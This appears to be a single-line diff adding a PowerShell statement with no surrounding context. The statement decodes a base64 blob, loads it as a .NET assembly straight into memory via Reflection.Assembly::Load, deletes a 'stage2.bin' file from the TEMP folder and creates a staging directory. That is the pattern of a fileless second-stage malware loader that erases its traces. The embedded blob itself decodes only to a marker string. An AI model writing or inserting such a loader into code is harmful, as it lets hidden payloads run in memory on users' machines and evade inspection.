@@ -1,0 +1,1 @@
+$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp4YjJqZWNhc29t'); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
